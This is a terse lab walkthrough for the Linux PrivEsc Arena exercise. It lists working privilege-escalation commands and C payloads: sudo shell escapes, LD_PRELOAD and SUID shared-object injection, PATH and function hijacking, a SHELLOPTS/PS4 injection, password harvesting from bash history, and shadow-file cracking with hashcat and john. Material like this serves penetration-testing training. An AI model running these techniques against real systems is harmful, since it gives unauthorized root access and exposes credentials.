# Linux PrivEsc Arena

<figure><img src="../../../../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>

Connection SSH&#x20;

```bash
 ssh -oHostKeyAlgorithms=+ssh-dss TCM@10.10.19.42
```

## Privilege Escalation - Kernel Exploits

### Detection

**/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh**

<figure><img src="../../../../.gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
[**https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c**](https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c)
{% endhint %}

### Privilege Escalation - Stored Passwords (Config Files & History)

<figure><img src="../../../../.gitbook/assets/image (366).png" alt=""><figcaption><p>Config File</p></figcaption></figure>

#### History!

```bash
 cat ~/.bash_history | grep -i passw
```

What was TCM trying to log into?

Who was TCM trying to log in as?&#x20;

Who was TCM trying to log in as?

<figure><img src="../../../../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>

```
unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```

### Privilege Escalation - SSH Keys

```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
sudo find /bin -name nano -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
sudo vim -c '!sh'
sudo apache2 -f /etc/shadow

```

```bash
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
```

### Privilege Escalation - Sudo (LD\_PRELOAD)

1. In command prompt type: sudo -l
2. From the output, notice that the LD\_PRELOAD environment variable is intact.

```c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
    }
    
    /*
        gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
        sudo LD_PRELOAD=/tmp/x.so apache2
    */
```

<figure><img src="../../../../.gitbook/assets/image (368).png" alt=""><figcaption></figcaption></figure>

```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
```

### Privilege Escalation - SUID (Shared Object Injection)

Detection

```bash
find / -type f -perm -04000 -ls 2>/dev/null
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

<figure><img src="../../../../.gitbook/assets/image (369).png" alt=""><figcaption></figcaption></figure>

Exploitation

```bash
 mkdir /home/user/.config
 cd /home/user/.config
 nano libcalc.c
#[code]
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-so
```

### Privilege Escalation - SUID (Environment Variables #1,2)

\#1 Detection

```bash
 find / -type f -perm -04000 -ls 2>/dev/null
 strings /usr/local/bin/suid-env
```

Exploitation

```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
 gcc /tmp/service.c -o /tmp/service
 export PATH=/tmp:$PATH
 /usr/local/bin/suid-env
```

\#2 Detection

```bash
 find / -type f -perm -04000 -ls 2>/dev/null
 /usr/local/bin/suid-env2
#1
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2

#2
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

### Privilege Escalation - Capabilities

```bash
 getcap -r / 2>/dev/null
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

